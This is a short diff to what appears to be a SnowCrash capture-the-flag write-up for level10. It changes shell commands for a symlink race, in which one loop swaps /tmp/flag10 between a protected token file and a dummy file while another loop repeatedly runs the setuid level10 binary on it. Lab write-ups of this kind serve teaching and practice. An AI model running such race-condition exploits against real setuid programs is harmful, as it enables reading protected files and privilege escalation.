@@ -70,8 +70,7 @@ level10@SnowCrash:~$ echo "token" > /tmp/token
 
 ## new term
 level10@SnowCrash:~$ cd /tmp/
-level10@SnowCrash:/tmp$ while true; do ln -sf /home/user/level10/token flag10; ln -sf /tmp/token flag10; done
-## new term
+level10@SnowCrash:~$ while true; do ln -sf /home/user/level10/token /tmp/flag10; ln -sf /tmp/token /tmp/flag10; done &
 level10@SnowCrash:~$ while true; do /home/user/level10/level10 /tmp/flag10 127.0.0.1; done
 
 ## first term
